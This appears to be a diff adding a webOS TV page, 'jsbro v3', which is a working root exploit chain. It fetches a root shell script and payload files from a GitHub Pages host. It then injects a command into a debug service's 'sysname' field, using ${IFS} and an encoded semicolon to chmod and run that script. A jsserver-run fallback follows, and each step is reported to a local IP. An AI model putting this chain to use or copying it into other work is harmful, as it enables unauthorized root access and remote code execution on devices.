@@ -1,0 +1,213 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>jsbro v3</title>
+  <style>
+    html, body { margin: 0; width: 100%; height: 100%; overflow: hidden; background: #050505; color: #f2efe8; font-family: sans-serif; }
+    body { display: flex; align-items: center; justify-content: center; }
+    main { min-width: 320px; max-width: 80vw; padding: 24px 28px; border: 1px solid #303030; border-radius: 12px; background: #101010; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.35); text-align: center; }
+    .label { margin: 0 0 10px; font-size: 14px; letter-spacing: 0.08em; text-transform: uppercase; color: #9f9f9f; }
+    .state { margin: 0; font-size: 32px; font-weight: 700; }
+    .pending { color: #f4c95d; }
+    .success { color: #64d98b; }
+    .failed { color: #ff7878; }
+    .detail { margin: 14px 0 0; font-size: 15px; color: #cecece; word-break: break-word; }
+  </style>
+</head>
+<body>
+  <main>
+    <p class="label">Jsbro v3 instrumented</p>
+    <p id="state" class="state pending">pending</p>
+    <p id="detail" class="detail">starting</p>
+  </main>
+  <script>
+    var stateEl = document.getElementById('state')
+    var detailEl = document.getElementById('detail')
+    var scriptPath = '/media/internal/downloads/root_v3.sh'
+    var downloadTarget = 'https://jyooi.github.io/tv-payload/root_v3.sh'
+    var payloadBase = 'https://jyooi.github.io/tv-payload/payload/'
+    var reportBase = 'http://192.168.100.231:8899/report/step/'
+    var targetDir = '/media/internal/downloads'
+    var SEMI = String.fromCharCode(59)
+
+    function setState(name, detail) {
+      stateEl.textContent = name
+      stateEl.className = 'state ' + name
+      detailEl.textContent = detail || ''
+    }
+
+    function failStep(step, detail) {
+      setState('failed', step + ': ' + (detail || 'unknown failure'))
+    }
+
+    function isObject(value) {
+      return value !== null && typeof value === 'object'
+    }
+
+    function parse(payload) {
+      if (typeof payload !== 'string') return payload
+      try {
+        return JSON.parse(payload)
+      } catch (e) {
+        return payload
+      }
+    }
+
+    function reportStep(name) {
+      try {
+        var b = new window.PalmServiceBridge()
+        b.onservicecallback = function (payload) {}
+        b.call('luna://com.webos.service.downloadmanager/download',
+          JSON.stringify({
+            target: reportBase + name + '?t=' + Date.now(),
+            targetDir: targetDir,
+            targetFilename: 'rpt.tmp',
+            subscribe: false
+          }))
+      } catch (e) {}
+    }
+
+    function runLegacyBroadcastInject() {
+      setState('pending', 'sending legacy broadcast inject')
+      reportStep('inject-legacy-sent')
+      var settled = false
+      var bridge = new window.PalmServiceBridge()
+      bridge.onservicecallback = function (payload) {
+        if (settled) return
+        var parsed = parse(payload)
+        if (isObject(parsed) && parsed.returnValue === false) {
+          settled = true
+          reportStep('inject-legacy-rejected')
+          setState('failed', 'legacy inject rejected: ' + (parsed.errorText || 'denied'))
+        } else if (isObject(parsed)) {
+          settled = true
+          reportStep('inject-legacy-accepted')
+        }
+      }
+      bridge.call('luna://com.webos.service.legacybroadcast.debug/menu',
+        JSON.stringify({
+          menu: 'ci',
+          data: "ciplus20: sub=/ cmd=unbind sysname='" + SEMI + "chmod${IFS}+x${IFS}" + scriptPath + SEMI + scriptPath + SEMI + "#'"
+        }))
+      setTimeout(runJsserverFallback, 15000)
+    }
+
+    function runJsserverFallback() {
+      setState('pending', 'trying jsserver fallback')
+      reportStep('inject-jsserver-sent')
+      var bridge = new window.PalmServiceBridge()
+      bridge.onservicecallback = function (payload) {
+        var parsed = parse(payload)
+        if (isObject(parsed) && parsed.returnValue === false) {
+          reportStep('inject-jsserver-rejected')
+          setState('failed', 'jsserver rejected: ' + (parsed.errorText || 'denied'))
+        } else if (isObject(parsed)) {
+          reportStep('inject-jsserver-accepted')
+        }
+      }
+      bridge.call('luna://com.webos.service.jsserver/run',
+        JSON.stringify({ "inputParams": "-- /tmp/cgroup dummy " + targetDir }))
+      setState('pending', 'root script running, watch for the result alert')
+    }
+
+    function runRootExploit() {
+      setState('pending', 'downloading payload files')
+      reportStep('payload-downloads-start')
+      var files = [
+        { name: 'package.json', url: payloadBase + 'package.json' },
+        { name: 'services.json', url: payloadBase + 'services.json' },
+        { name: 'exploit.js', url: payloadBase + 'exploit.js' }
+      ]
+      var written = 0
+
+      function onAllWritten() {
+        setState('pending', 'payload files ready')
+        reportStep('payload-downloads-done')
+        runLegacyBroadcastInject()
+      }
+
+      function downloadFile(file) {
+        var b = new window.PalmServiceBridge()
+        b.onservicecallback = function (payload) {
+          var parsed = parse(payload)
+          if (!isObject(parsed)) { failStep('payload download', file.name + ' invalid response') ; return }
+          if (parsed.returnValue === false) { failStep('payload download', file.name + ' ' + (parsed.errorText || 'failed')) ; return }
+          if (parsed.completed === true && !parsed.aborted && !parsed.interrupted) {
+            written++
+            setState('pending', 'downloaded ' + written + ' of ' + files.length + ' payload files')
+            if (written === files.length) onAllWritten()
+          } else if (parsed.aborted || parsed.interrupted || parsed.state === 'failed') {
+            failStep('payload download', file.name + ' ' + (parsed.errorText || 'aborted'))
+          }
+        }
+        b.call('luna://com.webos.service.downloadmanager/download',
+          JSON.stringify({
+            target: file.url,
+            targetDir: targetDir,
+            targetFilename: file.name,
+            subscribe: true
+          }))
+      }
+
+      files.forEach(downloadFile)
+    }
+
+    function watchDownload(ticket) {
+      var settled = false
+      var bridge = new window.PalmServiceBridge()
+      bridge.onservicecallback = function (payload) {
+        if (settled) return
+        var parsed = parse(payload)
+        if (!isObject(parsed)) { settled = true ; failStep('status query', 'invalid payload') ; return }
+        if (parsed.returnValue === false) { settled = true ; failStep('status query', parsed.errorText || 'failed') ; return }
+        if (parsed.completed === true && parsed.aborted !== true && parsed.interrupted !== true) {
+          settled = true
+          reportStep('script-download-done')
+          runRootExploit()
+          return
+        }
+        if (parsed.aborted === true || parsed.interrupted === true || parsed.state === 'failed') {
+          settled = true
+          failStep('download', parsed.errorText || 'download failed')
+          return
+        }
+        if (typeof parsed.amountReceived !== 'undefined' && typeof parsed.amountTotal !== 'undefined') {
+          setState('pending', 'downloading ' + parsed.amountReceived + ' / ' + parsed.amountTotal + ' bytes')
+          return
+        }
+        if (typeof parsed.target === 'string' || typeof parsed.state === 'string') {
+          setState('pending', parsed.target || parsed.state || 'downloading')
+          return
+        }
+        settled = true
+        failStep('status query', 'unexpected payload')
+      }
+      bridge.call('luna://com.webos.service.downloadmanager/downloadStatusQuery',
+        JSON.stringify({ ticket: ticket, subscribe: true }))
+    }
+
+    if (typeof window.PalmServiceBridge === 'undefined') {
+      failStep('bootstrap', 'PalmServiceBridge is not available')
+    } else {
+      reportStep('page-loaded')
+      var bridge = new window.PalmServiceBridge()
+      bridge.onservicecallback = function (payload) {
+        var parsed = parse(payload)
+        if (!isObject(parsed)) { failStep('download request', 'empty payload') ; return }
+        if (parsed.ticket) { setState('pending', 'script download accepted') ; watchDownload(parsed.ticket) ; return }
+        if (parsed.returnValue === false) { failStep('download request', parsed.errorText || 'failed') ; return }
+        failStep('download request', 'unexpected payload')
+      }
+      bridge.call('luna://com.webos.service.downloadmanager/download',
+        JSON.stringify({
+          target: downloadTarget,
+          targetDir: targetDir,
+          targetFilename: 'root_v3.sh',
+          subscribe: false
+        }))
+    }
+  </script>
+</body>
+</html>
